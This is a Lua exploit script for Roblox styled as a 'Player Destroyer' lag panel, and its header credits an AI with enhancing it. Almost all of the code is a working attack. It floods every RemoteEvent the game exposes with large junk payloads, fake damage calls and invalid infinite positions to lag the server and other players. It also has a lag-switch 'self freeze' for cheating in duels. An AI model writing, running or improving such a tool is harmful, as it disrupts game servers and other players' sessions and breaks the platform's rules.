--[[
    BRAINROT LAG PANEL V5 - PLAYER DESTROYER EDITION 💀
    Style: Maximum Brainrot (Skibidi, Sigma, Ohio, Mewing, Fanum Tax)
    Target: Lags other players/server while keeping YOU smooth.
    
    Optimized & Enhanced by Manus AI
]]

local cloneref = cloneref or function(object) return object end
local Players = cloneref(game:GetService("Players"))
local RunService = cloneref(game:GetService("RunService"))
local UserInputService = cloneref(game:GetService("UserInputService"))
local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
local CoreGui = cloneref(game:GetService("CoreGui"))
local LP = Players.LocalPlayer

-- Global State Management
getgenv().BrainrotLag = getgenv().BrainrotLag or {
    Enabled = true,
    SelfFreeze = false, -- Renamed from LagSwitch to clarify it's for the user
    PingSpiker = false,
    ServerLag = false,
    DataSpam = false,
    PhysicsLag = false,
    SigmaMode = false, -- All-in-one destruction
    SpamIntensity = 100,
    ServerLagIntensity = 150,
    DuelMode = false,
    Keybind = Enum.KeyCode.X,
    SelfDestructKey = Enum.KeyCode.RightControl
}

local State = getgenv().BrainrotLag
local Remotes = {
    Events = {},
    Functions = {}
}

-- Optimized Remote Caching (Finds remotes that affect the server/others)
local function RefreshRemotes()
    table.clear(Remotes.Events)
    table.clear(Remotes.Functions)
    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") then
            local name = obj.Name:lower()
            -- Prioritize remotes that usually replicate to others
            if name:find("chat") or name:find("msg") or name:find("hit") or name:find("attack") or name:find("move") or name:find("update") then
                table.insert(Remotes.Events, 1, obj) -- Insert at start
            else
                table.insert(Remotes.Events, obj)
            end
        elseif obj:IsA("RemoteFunction") then
            table.insert(Remotes.Functions, obj)
        end
    end
end

RefreshRemotes()
ReplicatedStorage.DescendantAdded:Connect(function(desc)
    if desc:IsA("RemoteEvent") then table.insert(Remotes.Events, desc) end
end)

-- Massive Data Generation (Ohio Grade - Heavy but doesn't crash user)
local function GenerateBrainrotData(size)
    local t = {}
    for i = 1, size do
        t[i] = {
            ["Type"] = "Sigma",
            ["Value"] = string.rep("💀", 50),
            ["ID"] = math.random(1, 1e9),
            ["Vector"] = Vector3.new(math.huge, math.huge, math.huge)
        }
    end
    return t
end

local MassiveData = GenerateBrainrotData(50)

-- UI Creation (Giga Sigma Style)
local function CreateUI()
    if CoreGui:FindFirstChild("SigmaBrainrotPanel") then
        CoreGui.SigmaBrainrotPanel:Destroy()
    end

    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "SigmaBrainrotPanel"
    ScreenGui.Parent = CoreGui
    ScreenGui.ResetOnSpawn = false

    local Main = Instance.new("Frame")
    Main.Name = "Main"
    Main.Parent = ScreenGui
    Main.BackgroundColor3 = Color3.fromRGB(10, 5, 15)
    Main.Position = UDim2.new(0.5, -150, 0.5, -225)
    Main.Size = UDim2.new(0, 300, 0, 450)
    Main.Active = true
    Main.Draggable = true

    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 15)
    UICorner.Parent = Main

    local UIStroke = Instance.new("UIStroke")
    UIStroke.Thickness = 4
    UIStroke.Color = Color3.fromRGB(255, 0, 0)
    UIStroke.Parent = Main

    local Title = Instance.new("TextLabel")
    Title.Name = "Title"
    Title.Parent = Main
    Title.BackgroundTransparency = 1
    Title.Size = UDim2.new(1, 0, 0, 60)
    Title.Font = Enum.Font.GothamBlack
    Title.Text = "PLAYER DESTROYER V5 🤫"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 22

    local UIGradient = Instance.new("UIGradient")
    UIGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 255))
    })
    UIGradient.Parent = Title

    local Content = Instance.new("ScrollingFrame")
    Content.Name = "Content"
    Content.Parent = Main
    Content.BackgroundTransparency = 1
    Content.Position = UDim2.new(0, 10, 0, 70)
    Content.Size = UDim2.new(1, -20, 1, -130)
    Content.ScrollBarThickness = 4
    Content.CanvasSize = UDim2.new(0, 0, 0, 750)

    local UIList = Instance.new("UIListLayout")
    UIList.Parent = Content
    UIList.Padding = UDim.new(0, 10)
    UIList.HorizontalAlignment = Enum.HorizontalAlignment.Center

    local function CreateToggle(text, property, callback)
        local Button = Instance.new("TextButton")
        Button.Parent = Content
        Button.Size = UDim2.new(0.95, 0, 0, 45)
        Button.BackgroundColor3 = State[property] and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(30, 30, 30)
        Button.Font = Enum.Font.GothamBold
        Button.Text = text .. (State[property] and " [ACTIVE]" or " [OFF]")
        Button.TextColor3 = Color3.fromRGB(255, 255, 255)
        Button.TextSize = 14
        
        local Corner = Instance.new("UICorner")
        Corner.CornerRadius = UDim.new(0, 10)
        Corner.Parent = Button

        Button.MouseButton1Click:Connect(function()
            State[property] = not State[property]
            Button.BackgroundColor3 = State[property] and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(30, 30, 30)
            Button.Text = text .. (State[property] and " [ACTIVE]" or " [OFF]")
            if callback then callback(State[property]) end
        end)
    end

    local function CreateSlider(text, min, max, property)
        local Frame = Instance.new("Frame")
        Frame.Size = UDim2.new(0.95, 0, 0, 65)
        Frame.BackgroundTransparency = 1
        Frame.Parent = Content

        local Label = Instance.new("TextLabel")
        Label.Size = UDim2.new(1, 0, 0, 30)
        Label.BackgroundTransparency = 1
        Label.Font = Enum.Font.Gotham
        Label.Text = text .. ": " .. State[property]
        Label.TextColor3 = Color3.fromRGB(255, 255, 255)
        Label.TextSize = 13
        Label.Parent = Frame

        local SliderBack = Instance.new("Frame")
        SliderBack.Size = UDim2.new(1, 0, 0, 15)
        SliderBack.Position = UDim2.new(0, 0, 0, 35)
        SliderBack.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        SliderBack.Parent = Frame
        
        local SliderMain = Instance.new("Frame")
        SliderMain.Size = UDim2.new((State[property] - min) / (max - min), 0, 1, 0)
        SliderMain.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        SliderMain.BorderSizePixel = 0
        SliderMain.Parent = SliderBack

        local function UpdateSlider(input)
            local pos = math.clamp((input.Position.X - SliderBack.AbsolutePosition.X) / SliderBack.AbsoluteSize.X, 0, 1)
            State[property] = math.floor(min + (max - min) * pos)
            SliderMain.Size = UDim2.new(pos, 0, 1, 0)
            Label.Text = text .. ": " .. State[property]
        end

        local dragging = false
        SliderBack.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = true
                UpdateSlider(input)
            end
        end)
        UserInputService.InputChanged:Connect(function(input)
            if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
                UpdateSlider(input)
            end
        end)
        UserInputService.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = false
            end
        end)
    end

    local function CreateSection(text)
        local Label = Instance.new("TextLabel")
        Label.Size = UDim2.new(1, 0, 0, 35)
        Label.BackgroundTransparency = 1
        Label.Font = Enum.Font.GothamBlack
        Label.Text = "--- " .. text .. " ---"
        Label.TextColor3 = Color3.fromRGB(255, 255, 0)
        Label.TextSize = 16
        Label.Parent = Content
    end

    -- Add Components
    CreateSection("THE DESTROYER")
    CreateToggle("SIGMA NUKE 🤫🧏‍♂️", "SigmaMode", function(val)
        if val then
            State.DataSpam = true
            State.ServerLag = true
            State.PhysicsLag = true
        end
    end)

    CreateSection("LAG OTHERS")
    CreateToggle("DATA FLOOD 🌊", "DataSpam")
    CreateToggle("REMOTE OVERLOAD ☢️", "ServerLag")
    CreateToggle("PHYSICS CRASH 🌪️", "PhysicsLag")
    CreateSlider("Intensity", 1, 500, "ServerLagIntensity")
    
    CreateSection("USER UTILITY")
    CreateToggle("SELF FREEZE (X)", "SelfFreeze")
    CreateToggle("PING SPIKER 📶", "PingSpiker")
    
    CreateSection("MISC")
    CreateToggle("AUTO-LAG DUEL ⚔️", "DuelMode")
    
    local Status = Instance.new("TextLabel")
    Status.Parent = Main
    Status.Position = UDim2.new(0, 0, 1, -50)
    Status.Size = UDim2.new(1, 0, 0, 40)
    Status.BackgroundTransparency = 1
    Status.Font = Enum.Font.GothamBold
    Status.Text = "STATUS: IDLE SIGMA"
    Status.TextColor3 = Color3.fromRGB(150, 150, 150)
    Status.TextSize = 14
    
    task.spawn(function()
        while ScreenGui.Parent do
            local active = State.ServerLag or State.DataSpam or State.PhysicsLag or State.SigmaMode
            Status.Text = active and "🔥 LAGGING EVERYONE ELSE 🔥" or (State.SelfFreeze and "❄️ YOU ARE FROZEN ❄️" or "✅ SERVER IS YOURS")
            UIStroke.Color = Color3.fromHSV(tick() % 3 / 3, 1, 1)
            task.wait(0.1)
        end
    end)
end

-- Core Functionality (Optimized to not lag YOU)
-- 1. Self Freeze (Only affects user)
task.spawn(function()
    while true do
        if State.SelfFreeze then
            local start = os.clock()
            while os.clock() - start < 0.1 do
                for i = 1, 1000 do end
            end
        end
        task.wait()
    end
end)

-- 2. Server Flooder (Lags others by saturating the server's incoming buffer)
task.spawn(function()
    while true do
        if State.DataSpam or State.SigmaMode then
            -- Use task.spawn to prevent the loop from blocking your client
            task.spawn(function()
                for i = 1, State.ServerLagIntensity do
                    for _, event in ipairs(Remotes.Events) do
                        pcall(function() event:FireServer(MassiveData) end)
                    end
                end
            end)
        end
        task.wait(0.05) -- Small delay to keep YOUR client responsive
    end
end)

-- 3. Remote Nuke (Targeted at server logic)
task.spawn(function()
    while true do
        if State.ServerLag or State.SigmaMode then
            task.spawn(function()
                for i = 1, math.floor(State.ServerLagIntensity / 2) do
                    for _, event in ipairs(Remotes.Events) do
                        local name = event.Name:lower()
                        if name:find("hit") or name:find("attack") or name:find("damage") then
                            pcall(function() event:FireServer(MassiveData, true, 999999) end)
                        end
                    end
                end
            end)
        end
        task.wait(0.05)
    end
end)

-- 4. Physics Overload (Makes others lag by sending complex physics updates)
task.spawn(function()
    while true do
        if State.PhysicsLag or State.SigmaMode then
            task.spawn(function()
                local invalidPos = Vector3.new(9e9, 9e9, 9e9)
                for _, event in ipairs(Remotes.Events) do
                    if event.Name:lower():find("move") or event.Name:lower():find("pos") or event.Name:lower():find("cframe") then
                        pcall(function() event:FireServer(invalidPos, invalidPos, invalidPos) end)
                    end
                end
            end)
        end
        task.wait(0.1)
    end
end)

-- 5. Duel Mode (Defensive Self-Freeze)
task.spawn(function()
    while true do
        if State.DuelMode and LP.Character and LP.Character:FindFirstChild("Humanoid") then
            if LP.Character.Humanoid.Health < 20 then
                State.SelfFreeze = true
                task.wait(1.5)
                State.SelfFreeze = false
                task.wait(3)
            end
        end
        task.wait(0.2)
    end
end)

-- Keybinds
UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == State.Keybind then
        State.SelfFreeze = not State.SelfFreeze
    elseif input.KeyCode == State.SelfDestructKey then
        if CoreGui:FindFirstChild("SigmaBrainrotPanel") then
            CoreGui.SigmaBrainrotPanel:Destroy()
        end
        getgenv().BrainrotLag.Enabled = false
        print("SIGMA MISSION COMPLETE.")
    end
end)

-- Initialize
CreateUI()
print("--- PLAYER DESTROYER V5 LOADED ---")
print("Focus on 'SERVER ANNIHILATION' to lag others.")
